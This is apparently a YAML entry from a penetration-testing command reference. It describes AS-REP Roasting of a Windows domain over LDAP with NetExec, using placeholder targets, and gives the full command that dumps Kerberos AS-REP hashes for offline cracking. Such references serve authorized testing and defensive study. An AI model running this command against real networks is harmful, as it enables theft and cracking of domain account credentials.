---
description: |
  NetExec (formerly CrackMapExec) performs an AS-REP Roasting attack via the LDAP service.
  This command attempts to enumerate domain accounts that do not require pre-authentication 
  and requests Kerberos AS-REP responses for them. The extracted encrypted ticket-granting 
  ticket (TGT) hashes are saved into the specified file and can later be cracked offline 
  to recover plaintext credentials.

  Command Reference:

  	Target IP: 10.10.10.1
  	Domain: test.local
  	Username List: users.txt
  	Password: (empty string)
  	Output File: output.txt

command: |
  nxc ldap 10.10.10.1 -u users.txt -p '' --asreproast output.txt
items:
  - Username
  - Hash
services:
  - LDAP
OS:
  - Linux
  - Windows
attack_types:
  - Credential Access
  - AS-REP Roasting
references:
  - https://github.com/Pennyw0rth/NetExec
  - https://attack.mitre.org/techniques/T1558/004/
---
